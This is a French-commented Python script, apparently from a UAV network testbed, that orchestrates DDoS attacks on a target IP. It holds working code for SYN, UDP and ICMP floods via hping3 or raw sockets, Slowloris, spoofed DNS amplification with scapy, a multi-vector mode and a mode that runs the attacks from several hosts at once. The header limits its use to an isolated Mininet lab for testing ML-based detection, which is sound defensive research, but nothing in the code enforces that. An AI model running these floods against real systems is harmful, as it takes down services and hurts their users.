#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 attack_orchestrator.py — Lanceur d'attaques DDoS multi-vecteurs (testbed UAV)
================================================================================
 ⚠ USAGE LABO STRICTEMENT ! ⚠
 Ce script ne doit JAMAIS être utilisé en dehors d'un environnement Mininet
 isolé. Il sert UNIQUEMENT à valider la détection ML du contrôleur Ryu.

 Vecteurs disponibles :
   1. SYN flood       (TCP)        — hping3
   2. UDP flood       (UDP)        — hping3 / scapy
   3. ICMP flood      (ICMP)       — hping3
   4. Slowloris       (HTTP)       — sockets natifs
   5. DNS amplification (UDP 53)   — scapy spoofé
   6. Multi-vector    (3 attaques en parallèle)

 Lancement (depuis CLI Mininet) :
   xterm recon1
   python3 /tmp/attack_orchestrator.py --type syn --target 192.168.100.10 --duration 30

 Lancement distribué (orchestre N drones compromis) :
   python3 /tmp/attack_orchestrator.py --distributed --attackers recon1,surv2,logi3 \
       --target 192.168.100.10 --type udp --duration 60

================================================================================
"""

import argparse
import os
import random
import signal
import socket
import struct
import subprocess
import sys
import threading
import time

LOG_PREFIX = "[ATK]"


# ══ Détection des outils disponibles ═════════════════════════════════════════

def _have(cmd):
    return subprocess.call(["which", cmd], stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL) == 0


HAS_HPING3 = _have("hping3")
HAS_SCAPY  = False
try:
    import scapy.all as scapy   # noqa: F401
    HAS_SCAPY = True
except ImportError:
    pass


# ══ ATTAQUES ═════════════════════════════════════════════════════════════════

def syn_flood(target, duration, port=80):
    """SYN flood TCP avec hping3 ou fallback Python."""
    print(f"{LOG_PREFIX} SYN flood → {target}:{port} pendant {duration}s")
    if HAS_HPING3:
        cmd = ["hping3", "-S", "-p", str(port), "--flood",
               "--rand-source", target]
        return _run_for(cmd, duration)
    else:
        return _python_syn_flood(target, port, duration)


def udp_flood(target, duration, port=14550):
    """UDP flood — vise par défaut le port telemetry (14550)."""
    print(f"{LOG_PREFIX} UDP flood → {target}:{port} pendant {duration}s")
    if HAS_HPING3:
        cmd = ["hping3", "--udp", "-p", str(port), "--flood",
               "--rand-source", "-d", "120", target]
        return _run_for(cmd, duration)
    else:
        return _python_udp_flood(target, port, duration)


def icmp_flood(target, duration):
    """ICMP flood (ping-of-death style)."""
    print(f"{LOG_PREFIX} ICMP flood → {target} pendant {duration}s")
    if HAS_HPING3:
        cmd = ["hping3", "--icmp", "--flood", "--rand-source",
               "-d", "1024", target]
        return _run_for(cmd, duration)
    else:
        # ping standard en boucle
        cmd = ["ping", "-f", "-s", "1024", target]
        try:
            return _run_for(cmd, duration)
        except Exception:
            return _python_icmp_flood(target, duration)


def slowloris(target, duration, port=80, n_sockets=200):
    """Attaque Slowloris : ouvre N connexions HTTP semi-complètes."""
    print(f"{LOG_PREFIX} Slowloris → {target}:{port}  ({n_sockets} sockets, {duration}s)")
    sockets = []
    end = time.time() + duration

    def _open_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Accept-language: fr-FR,fr;q=0.9\r\n")
            return s
        except Exception:
            return None

    # Phase 1 : ouverture
    for _ in range(n_sockets):
        s = _open_socket()
        if s:
            sockets.append(s)
    print(f"{LOG_PREFIX} {len(sockets)}/{n_sockets} sockets ouvertes")

    # Phase 2 : keep-alive
    while time.time() < end:
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except Exception:
                sockets.remove(s)
                ns = _open_socket()
                if ns:
                    sockets.append(ns)
        time.sleep(10)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
    print(f"{LOG_PREFIX} Slowloris terminé")
    return True


def dns_amp(target, duration, dns_servers=None):
    """Simulation DNS amplification (requêtes spoofées)."""
    if dns_servers is None:
        dns_servers = ["10.0.0.11", "10.0.0.12", "10.0.0.13"]
    print(f"{LOG_PREFIX} DNS amp → spoof src={target} via {len(dns_servers)} relais")
    if not HAS_SCAPY:
        print(f"{LOG_PREFIX} scapy absent → fallback UDP flood port 53")
        return udp_flood(target, duration, port=53)

    end = time.time() + duration
    sent = 0
    while time.time() < end:
        for dns in dns_servers:
            pkt = (scapy.IP(src=target, dst=dns) /
                   scapy.UDP(sport=random.randint(1024, 65000), dport=53) /
                   scapy.DNS(rd=1, qd=scapy.DNSQR(qname="version.bind",
                                                   qtype="TXT", qclass="CHAOS")))
            try:
                scapy.send(pkt, verbose=False)
                sent += 1
            except Exception:
                break
        time.sleep(0.001)
    print(f"{LOG_PREFIX} DNS amp terminé ({sent} requêtes)")
    return True


def multi_vector(target, duration):
    """Lance SYN + UDP + ICMP en parallèle."""
    print(f"{LOG_PREFIX} MULTI-VECTOR → {target} pendant {duration}s")
    threads = [
        threading.Thread(target=syn_flood,  args=(target, duration)),
        threading.Thread(target=udp_flood,  args=(target, duration)),
        threading.Thread(target=icmp_flood, args=(target, duration)),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return True


# ══ Helpers ═══════════════════════════════════════════════════════════════════

def _run_for(cmd, duration):
    """Lance une commande externe et la tue après duration secondes."""
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                                preexec_fn=os.setsid)
    except FileNotFoundError:
        print(f"{LOG_PREFIX} commande introuvable : {cmd[0]}", file=sys.stderr)
        return False
    try:
        proc.wait(timeout=duration)
    except subprocess.TimeoutExpired:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        proc.wait()
    return True


def _python_syn_flood(target, port, duration):
    """SYN flood Python (lent mais fonctionne sans hping3)."""
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            try:
                s.connect((target, port))
            except Exception:
                pass
            s.close()
            sent += 1
        except Exception:
            time.sleep(0.001)
    print(f"{LOG_PREFIX} SYN flood Python : {sent} tentatives")
    return True


def _python_udp_flood(target, port, duration):
    """UDP flood Python (paquets aléatoires)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + duration
    sent = 0
    payload = os.urandom(120)
    while time.time() < end:
        try:
            sock.sendto(payload, (target, port))
            sent += 1
        except Exception:
            time.sleep(0.001)
    print(f"{LOG_PREFIX} UDP flood Python : {sent} paquets")
    sock.close()
    return True


def _python_icmp_flood(target, duration):
    """ICMP echo en raw socket (nécessite root)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print(f"{LOG_PREFIX} ICMP raw nécessite root — fallback ping", file=sys.stderr)
        cmd = ["ping", "-i", "0.001", target]
        return _run_for(cmd, duration)

    end = time.time() + duration
    sent = 0
    seq = 0
    while time.time() < end:
        seq = (seq + 1) & 0xFFFF
        # ICMP type=8 (echo), code=0
        header = struct.pack("!BBHHH", 8, 0, 0, 0xBEEF, seq)
        payload = os.urandom(56)
        chk = _icmp_checksum(header + payload)
        header = struct.pack("!BBHHH", 8, 0, chk, 0xBEEF, seq)
        try:
            s.sendto(header + payload, (target, 0))
            sent += 1
        except Exception:
            time.sleep(0.001)
    s.close()
    print(f"{LOG_PREFIX} ICMP flood Python : {sent} paquets")
    return True


def _icmp_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xFFFF)
    s = s + (s >> 16)
    return ~s & 0xFFFF


# ══ MODE DISTRIBUÉ ════════════════════════════════════════════════════════════

def distributed_attack(attackers, target, atype, duration):
    """Lance l'attaque depuis plusieurs drones via SSH/exec mininet."""
    print(f"{LOG_PREFIX} Attaque DISTRIBUÉE depuis {attackers} → {target}")
    procs = []
    for a in attackers:
        # Suppose qu'on est dans Mininet et qu'on peut faire mn_exec
        cmd = (f"mnexec -a $(pgrep -f 'mininet:{a}') "
               f"python3 {sys.argv[0]} --type {atype} --target {target} "
               f"--duration {duration}")
        try:
            p = subprocess.Popen(cmd, shell=True)
            procs.append(p)
        except Exception as e:
            print(f"{LOG_PREFIX} Erreur lancement {a}: {e}", file=sys.stderr)
    for p in procs:
        p.wait()


# ══ MAIN ══════════════════════════════════════════════════════════════════════

ATTACKS = {
    "syn":     lambda t, d: syn_flood(t, d),
    "udp":     lambda t, d: udp_flood(t, d),
    "icmp":    lambda t, d: icmp_flood(t, d),
    "slow":    lambda t, d: slowloris(t, d),
    "dns":     lambda t, d: dns_amp(t, d),
    "multi":   lambda t, d: multi_vector(t, d),
}


def main():
    parser = argparse.ArgumentParser(description="Lanceur d'attaques DDoS — TESTBED UNIQUEMENT")
    parser.add_argument("--type", choices=list(ATTACKS.keys()),
                        default="syn", help="Vecteur d'attaque")
    parser.add_argument("--target", required=True,
                        help="IP cible")
    parser.add_argument("--duration", type=int, default=30,
                        help="Durée en secondes (défaut: 30)")
    parser.add_argument("--distributed", action="store_true",
                        help="Mode distribué (orchestre plusieurs drones)")
    parser.add_argument("--attackers", default="",
                        help="Liste d'attaquants en mode distribué (ex: recon1,surv2)")
    args = parser.parse_args()

    print(f"{LOG_PREFIX} hping3={'OK' if HAS_HPING3 else 'absent'} | "
          f"scapy={'OK' if HAS_SCAPY else 'absent'}")

    if args.distributed:
        attackers = [a.strip() for a in args.attackers.split(",") if a.strip()]
        if not attackers:
            parser.error("--attackers requis avec --distributed")
        distributed_attack(attackers, args.target, args.type, args.duration)
    else:
        try:
            ATTACKS[args.type](args.target, args.duration)
        except KeyboardInterrupt:
            print(f"\n{LOG_PREFIX} interrompu")


if __name__ == "__main__":
    main()
